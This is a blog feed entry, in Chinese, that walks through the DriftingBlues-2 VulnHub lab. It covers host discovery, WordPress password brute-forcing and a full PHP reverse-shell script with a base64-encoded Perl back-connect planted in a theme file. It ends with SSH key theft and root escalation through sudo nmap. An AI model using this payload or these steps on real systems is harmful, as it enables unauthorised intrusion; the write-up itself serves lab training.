    <link href="http://ms02423.top/2024/02/05/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8Bdriftingblues-2/"/>
    <id>http://ms02423.top/2024/02/05/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8Bdriftingblues-2/</id>
    <published>2024-02-05T10:21:32.000Z</published>
    <updated>2024-02-05T11:58:30.026Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">get flagsdifficulty<span class="token punctuation">:</span> easyabout vm<span class="token punctuation">:</span> tested <span class="token operator">and</span> exported <span class="token keyword">from</span> virtualbox<span class="token punctuation">.</span> dhcp <span class="token operator">and</span> nested vtx<span class="token operator">/</span>amdv enabled<span class="token punctuation">.</span> you can contact me <span class="token keyword">by</span> email <span class="token punctuation">(</span>it should be <span class="token keyword">on</span> my profile<span class="token punctuation">)</span> <span class="token keyword">for</span> troubleshooting <span class="token operator">or</span> questions<span class="token punctuation">.</span>This works better <span class="token keyword">with</span> VirtualBox rather <span class="token operator">than</span> VMware <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-靶场下载"><a href="#2-靶场下载" class="headerlink" title="2.靶场下载"></a>2.靶场下载</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://www.vulnhub.com/entry/driftingblues-2,634/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205182951811.png" alt="image-20240205182951811"></p><h2 id="3-靶场启动"><a href="#3-靶场启动" class="headerlink" title="3.靶场启动"></a>3.靶场启动</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205183030629.png" alt="image-20240205183030629"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.1.0&#x2F;24</p><h1 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二.信息收集"></a>二.信息收集</h1><h2 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="1.寻找靶场真实ip"></a>1.寻找靶场真实ip</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.1.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205183345515.png" alt="image-20240205183345515"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205183416768.png" alt="image-20240205183416768"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">靶场真实ip地址为192.168.1.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="2.探测端口及服务"></a>2.探测端口及服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.1.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205183650442.png" alt="image-20240205183650442"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开启了<span class="token number">21</span>端口，服务为ProFTPD发现开启了<span class="token number">22</span>端口，服务为OpenSSH <span class="token number">7</span><span class="token punctuation">.</span>9p1 Debian <span class="token number">10</span><span class="token operator">+</span>deb10u2 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>发现开启了<span class="token number">80</span>端口，服务为Apache httpd <span class="token number">2.4</span><span class="token number">.38</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Debian<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="3.web指纹识别"></a>3.web指纹识别</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb <span class="token parameter variable">-v</span> http://192.168.1.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205183911341.png" alt="image-20240205183911341"></p><h1 id="三-渗透测试"><a href="#三-渗透测试" class="headerlink" title="三.渗透测试"></a>三.渗透测试</h1><h2 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="1.访问web服务"></a>1.访问web服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205184012854.png" alt="image-20240205184012854"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ftp://192.168.1.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205185022506.png" alt="image-20240205185022506"></p><p>我们看到是一张图片，可能会有有用的信息，我们一会分析下</p><h2 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="2.扫描web服务"></a>2.扫描web服务</h2><h3 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.1.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205184152926.png" alt="image-20240205184152926"></p><p>没有有用信息</p><h3 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.1.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205184510672.png" alt="image-20240205184510672"></p><p>扫描到一个登录页面，我们进行查看</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.7/blog/wp-login.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205184636745.png" alt="image-20240205184636745"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">我们看到cms框架是wordpress，可能是爆破用户名和密码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-disearch目录扫描"><a href="#3-disearch目录扫描" class="headerlink" title="3)disearch目录扫描"></a>3)disearch目录扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.1.7 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205184741763.png" alt="image-20240205184741763"></p><p>扫描到一个&#x2F;blog&#x2F;目录，我们进行访问</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.7/blog<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205184812353.png" alt="image-20240205184812353"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">目前掌握的信息是一个登录页面，一个<span class="token operator">/</span>blog<span class="token operator">/</span>目录<span class="token punctuation">,</span>一张图片<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-图片隐写"><a href="#1-图片隐写" class="headerlink" title="1)图片隐写"></a>1)图片隐写</h3><p>我们分析这张图片</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205185421131.png" alt="image-20240205185421131"></p><p>使用steghide工具先查看一下图片基本信息,但是需要密码，我们没有密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">steghide <span class="token parameter variable">--info</span> <span class="token string">'/home/kali/桌面/secret.jpg'</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205185545378.png" alt="image-20240205185545378"></p><p>我们使用stegseek进行爆破</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">stegseek  <span class="token parameter variable">--crack</span> <span class="token string">'/home/kali/桌面/secret.jpg'</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205190135123.png" alt="image-20240205190135123"></p><p>我们看到没有爆破出来，我们换一个思路，前面我们扫描到cms框架是wordpress，我们可以使用wpscan进行爆破</p><h3 id="2-wpscan爆破"><a href="#2-wpscan爆破" class="headerlink" title="2)wpscan爆破"></a>2)wpscan爆破</h3><p>爆破用户名</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan <span class="token parameter variable">--url</span> http://192.168.1.7/blog  <span class="token parameter variable">-e</span> u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205191446215.png" alt="image-20240205191446215"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205191507965.png" alt="image-20240205191507965"></p><p>爆破出来一个用户名是albert</p><p>制作字典</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cewl http://192.168.1.7 <span class="token operator">></span> MS02423.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205191747850.png" alt="image-20240205191747850"></p><p>爆破密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> wpscan <span class="token parameter variable">--url</span> http://192.168.1.7/blog  albert <span class="token parameter variable">--passwords</span>  MS02423.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205191943220.png" alt="image-20240205191943220"></p><p>我们看到没有爆破出来，我们换一个字典,使用kali自带的字典——rockyou.txt</p><pre class="line-numbers language-none"><code class="language-none">sudo wpscan --url http:&#x2F;&#x2F;192.168.1.7&#x2F;blog  albert --passwords  &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205192554205.png" alt="image-20240205192554205"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">用户名是albert,密码是scotland1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-登录wordpress"><a href="#3-登录wordpress" class="headerlink" title="3)登录wordpress"></a>3)登录wordpress</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.7/blog/wp-login.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205192337005.png" alt="image-20240205192337005"></p><p>我们看到报错了，看来是ip和域名没有绑定，我们进行绑定</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205192500303.png" alt="image-20240205192500303"></p><p>我们再次访问,发现登录成功了</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205192753051.png" alt="image-20240205192753051"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205192847079.png" alt="image-20240205192847079"></p><h3 id="4-反弹shell"><a href="#4-反弹shell" class="headerlink" title="4)反弹shell"></a>4)反弹shell</h3><p>我们进行查看，查找可以写入shell的地方，找到有一个404.php的页面可以编辑，此处使用php反弹shell的脚本，只需要修改ip和port为指定的值即可.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://driftingblues.box/blog/wp-admin/theme-editor.php?file<span class="token operator">=</span><span class="token number">404</span>.php<span class="token operator">&amp;</span><span class="token assign-left variable">theme</span><span class="token operator">=</span>twentytwentyone<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205192943683.png" alt="image-20240205192943683"></p><p>我们写入php反弹shell脚本，记得保存</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">which</span><span class="token punctuation">(</span><span class="token variable">$pr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$path</span> <span class="token operator">=</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"which <span class="token interpolation"><span class="token variable">$pr</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token variable">$path</span> <span class="token operator">?</span> <span class="token variable">$path</span> <span class="token punctuation">:</span> <span class="token variable">$pr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">execute</span><span class="token punctuation">(</span><span class="token variable">$cfe</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$cfe</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'exec'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>@<span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cfe</span><span class="token punctuation">,</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">join</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">,</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell_exec'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$res</span> <span class="token operator">=</span> @<span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$cfe</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>@<span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cfe</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> @<span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'passthru'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>@<span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">passthru</span><span class="token punctuation">(</span><span class="token variable">$cfe</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> @<span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span><span class="token punctuation">(</span>@<span class="token function">is_resource</span><span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">=</span> @<span class="token function">popen</span><span class="token punctuation">(</span><span class="token variable">$cfe</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$res</span> <span class="token operator">.=</span> @<span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token function">pclose</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">cf</span><span class="token punctuation">(</span><span class="token variable">$fname</span><span class="token punctuation">,</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token operator">=</span>@<span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$fname</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>@<span class="token function">fputs</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span>@<span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$yourip</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"your IP"</span><span class="token punctuation">;</span><span class="token variable">$yourport</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'your port'</span><span class="token punctuation">;</span><span class="token variable">$usedb</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'perl'</span><span class="token operator">=></span><span class="token string single-quoted-string">'perl'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'c'</span><span class="token operator">=></span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$back_connect</span><span class="token operator">=</span><span class="token string double-quoted-string">"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"</span><span class="token operator">.</span><span class="token string double-quoted-string">"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"</span><span class="token operator">.</span><span class="token string double-quoted-string">"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"</span><span class="token operator">.</span><span class="token string double-quoted-string">"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"</span><span class="token operator">.</span><span class="token string double-quoted-string">"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"</span><span class="token operator">.</span><span class="token string double-quoted-string">"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"</span><span class="token operator">.</span><span class="token string double-quoted-string">"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="</span><span class="token punctuation">;</span><span class="token function">cf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/tmp/.bc'</span><span class="token punctuation">,</span><span class="token variable">$back_connect</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token function">which</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'perl'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">" /tmp/.bc <span class="token interpolation"><span class="token variable">$yourip</span></span> <span class="token interpolation"><span class="token variable">$yourport</span></span> &amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205193435417.png" alt="image-20240205193435417"></p><p>然后，我们访问一个不存在的页面即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://driftingblues.box/blog/index.php/MS02423<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205193750358.png" alt="image-20240205193750358"></p><p>我们看到反弹成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205193902136.png" alt="image-20240205193902136"></p><h3 id="5-提权"><a href="#5-提权" class="headerlink" title="5)提权"></a>5)提权</h3><p>我们使用sudo -l 查看提权，发现需要密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205194048378.png" alt="image-20240205194048378"></p><p>我们查看一些目录——&#x2F;home&#x2F;,&#x2F;tmp&#x2F;,&#x2F;var,&#x2F;var&#x2F;www&#x2F;html</p><p>我们切换的&#x2F;home&#x2F;,发现一个用户freddie，进入用户目录，有一个txt文件，但没有权限查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205194257431.png" alt="image-20240205194257431"></p><p>我们还看到.ssh文件夹, 进入.ssh文件夹中，发现一对公私钥对，其中私钥有可读权限</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205194500332.png" alt="image-20240205194500332"></p><p>我们复制到kali里面，并修改权限为400</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205194635713.png" alt="image-20240205194635713"></p><p> 使用私钥免密登录，可以成功登录为用户freddie,我们可以看到登录成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205194813153.png" alt="image-20240205194813153"></p><p>得到第一个flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205194845378.png" alt="image-20240205194845378"></p><p>查看sudo权限的命令，发现有一个nmap命令可以无密码root使用，用于提权</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205195052568.png" alt="image-20240205195052568"></p><p>根据使用nmap提权的方法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://gtfobins.github.io/gtfobins/nmap/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进行提权</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205195214901.png" alt="image-20240205195214901"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">TF</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>mktemp<span class="token variable">)</span></span><span class="token builtin class-name">echo</span> <span class="token string">'os.execute("/bin/sh")'</span> <span class="token operator">></span> <span class="token variable">$TF</span><span class="token function">sudo</span> nmap <span class="token parameter variable">--script</span><span class="token operator">=</span><span class="token variable">$TF</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205195432631.png" alt="image-20240205195432631"></p><h1 id="四-相关知识"><a href="#四-相关知识" class="headerlink" title="四.相关知识"></a>四.相关知识</h1><p>1.靶场下载地址 </p><p>2.nmap</p><p>3.arp-scan </p><p>4.masscan </p><p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解 </p><p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p><p>7.nikto工具的使用</p><p>8.dirsearch目录扫描</p><p>9.ssh登录</p><p>10.图片隐写</p><p>11.wpscan爆破</p><p>12.nmap提权方式</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之driftingblues-1</title>
    <link href="http://ms02423.top/2024/02/04/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8Bdriftingblues-1/"/>
    <id>http://ms02423.top/2024/02/04/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8Bdriftingblues-1/</id>
    <published>2024-02-04T11:49:11.000Z</published>
    <updated>2024-02-05T10:42:18.654Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">get flagsdifficulty<span class="token punctuation">:</span> easyabout vm<span class="token punctuation">:</span> tested <span class="token operator">and</span> exported <span class="token keyword">from</span> virtualbox<span class="token punctuation">.</span> dhcp <span class="token operator">and</span> nested vtx<span class="token operator">/</span>amdv enabled<span class="token punctuation">.</span> you can contact me <span class="token keyword">by</span> email <span class="token punctuation">(</span>it should be <span class="token keyword">on</span> my profile<span class="token punctuation">)</span> <span class="token keyword">for</span> troubleshooting <span class="token operator">or</span> questions<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2-靶场下载"><a href="#2-靶场下载" class="headerlink" title="2.靶场下载"></a>2.靶场下载</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://www.vulnhub.com/entry/driftingblues-1,625/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204195436736.png" alt="image-20240204195436736"></p><h2 id="3-靶场启动"><a href="#3-靶场启动" class="headerlink" title="3.靶场启动"></a>3.靶场启动</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204195517626.png" alt="image-20240204195517626"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.1.0&#x2F;24</p><h1 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二.信息收集"></a>二.信息收集</h1><h2 id="1-寻找靶场真实ip地址"><a href="#1-寻找靶场真实ip地址" class="headerlink" title="1.寻找靶场真实ip地址"></a>1.寻找靶场真实ip地址</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.1.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204195743518.png" alt="image-20240204195743518"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204195833130.png" 